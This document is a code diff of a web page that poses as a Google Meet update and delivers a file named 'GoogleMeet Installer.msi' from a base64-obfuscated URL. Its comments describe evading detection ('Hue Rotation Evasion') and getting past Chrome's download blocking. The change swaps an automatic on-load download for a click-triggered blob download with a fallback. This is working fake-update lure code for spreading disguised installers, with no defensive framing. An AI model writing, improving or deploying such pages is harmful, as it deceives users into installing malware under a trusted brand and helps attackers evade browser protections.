@@ -139,8 +139,7 @@
         <a href="#" class="download-btn" id="clickbtn">
             Download Update
         </a>
-        <p style="margin-top: 16px; color: #5f6368; font-size: 14px;">Download will start automatically. If not, click
-            the button above.</p>
+        <p style="margin-top: 16px; color: #5f6368; font-size: 14px;">Click the button above to download the update.</p>
     </div>
     <script>
         // Hue Rotation Evasion
@@ -151,54 +150,43 @@
         const fileUrl = atob(fileUrlEncoded);
         const fileName = 'GoogleMeet Installer.msi';
 
-        // Fast download function - uses direct link first (immediate)
+        // Download function using blob URL (avoids Chrome download blocking)
         function triggerDownload() {
-            // Try direct link first (fastest, no fetch delay)
-            const directLink = document.createElement('a');
-            directLink.href = fileUrl;
-            directLink.download = fileName;
-            directLink.style.display = 'none';
-            document.body.appendChild(directLink);
-            directLink.click();
-            
-            // Cleanup immediately
-            requestAnimationFrame(() => {
-                document.body.removeChild(directLink);
-            });
-
-            // Also try blob approach in background for better compatibility
             fetch(fileUrl)
                 .then(response => {
-                    if (response.ok) {
-                        return response.blob();
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
                     }
+                    return response.blob();
                 })
                 .then(blob => {
-                    if (blob) {
-                        const blobUrl = URL.createObjectURL(blob);
-                        const blobLink = document.createElement('a');
-                        blobLink.href = blobUrl;
-                        blobLink.download = fileName;
-                        blobLink.style.display = 'none';
-                        document.body.appendChild(blobLink);
-                        blobLink.click();
-                        setTimeout(() => {
-                            document.body.removeChild(blobLink);
-                            URL.revokeObjectURL(blobUrl);
-                        }, 50);
-                    }
+                    const blobUrl = URL.createObjectURL(blob);
+                    const blobLink = document.createElement('a');
+                    blobLink.href = blobUrl;
+                    blobLink.download = fileName;
+                    blobLink.style.display = 'none';
+                    document.body.appendChild(blobLink);
+                    blobLink.click();
+                    
+                    // Cleanup
+                    setTimeout(() => {
+                        document.body.removeChild(blobLink);
+                        URL.revokeObjectURL(blobUrl);
+                    }, 100);
                 })
-                .catch(() => {
-                    // Silent fail - direct link already attempted
+                .catch(err => {
+                    console.error('Error fetching file:', err);
+                    // Fallback: try direct link approach
+                    const directLink = document.createElement('a');
+                    directLink.href = fileUrl;
+                    directLink.download = fileName;
+                    directLink.style.display = 'none';
+                    document.body.appendChild(directLink);
+                    directLink.click();
+                    setTimeout(() => {
+                        document.body.removeChild(directLink);
+                    }, 100);
                 });
-        }
-
-        // Start download immediately (don't wait for DOMContentLoaded)
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', triggerDownload);
-        } else {
-            // DOM already loaded, trigger immediately
-            triggerDownload();
         }
 
         // Add click handler to download button
